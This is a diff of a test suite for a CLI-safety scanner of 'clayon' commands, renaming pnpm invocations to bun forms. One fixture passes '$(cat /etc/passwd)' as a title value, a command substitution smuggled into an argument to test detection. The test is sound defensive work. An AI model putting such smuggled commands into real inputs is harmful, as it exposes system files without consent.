@@ -934,15 +934,15 @@ describe("clayon CLI invocation safety", () => {
     const skill = read("skills/clayon/SKILL.md");
     expect(skill).toContain("CLI safety");
     expect(skill).toContain("npx clayon");
-    expect(skill).toContain("Do not use `pnpm clayon`");
+    expect(skill).toContain("Do not use `bun run clayon`");
   });
 
   // ── Backslash line continuation ──────────────────────────────────────────
 
-  it("flags a content-bearing pnpm clayon command split across continued lines", () => {
+  it("flags a content-bearing bun run clayon command split across continued lines", () => {
     const source = [
       "```sh",
-      "pnpm clayon issue create \\",
+      "bun run clayon issue create \\",
       '  --company-id <company-id> \\',
       '  --title "$(cat /etc/passwd)"',
       "```",
@@ -955,7 +955,7 @@ describe("clayon CLI invocation safety", () => {
 
   it("flags a continued command whose only content-bearing flag sits on the last line", () => {
     const source = [
-      "pnpm clayon worktree init \\",
+      "bun run clayon worktree init \\",
       "  --force \\",
       "  --name PAP-000-example",
     ].join("\n");
@@ -974,19 +974,19 @@ describe("clayon CLI invocation safety", () => {
     expect(scanText("doc/EXAMPLE.md", source)).toEqual([]);
   });
 
-  it("does not flag a continued pnpm clayon command that stays on the allowlist", () => {
+  it("does not flag a continued bun run clayon command that stays on the allowlist", () => {
     const source = [
-      "pnpm clayon env-lab \\",
+      "bun run clayon env-lab \\",
       "  status \\",
       "  --json",
     ].join("\n");
     expect(scanText("doc/EXAMPLE.md", source)).toEqual([]);
   });
 
-  it("flags a recommended pnpm exec clayon line but skips a warning line", () => {
-    expect(recommendsBrokenExecForm("Run pnpm exec clayon issue create --title x")).toBe(true);
+  it("flags a recommended bun x clayon line but skips a warning line", () => {
+    expect(recommendsBrokenExecForm("Run bun x clayon issue create --title x")).toBe(true);
     expect(
-      recommendsBrokenExecForm("`pnpm exec clayon <command> <args>` — broken. Do not use it."),
+      recommendsBrokenExecForm("`bun x clayon <command> <args>` — broken. Do not use it."),
     ).toBe(false);
   });
 });
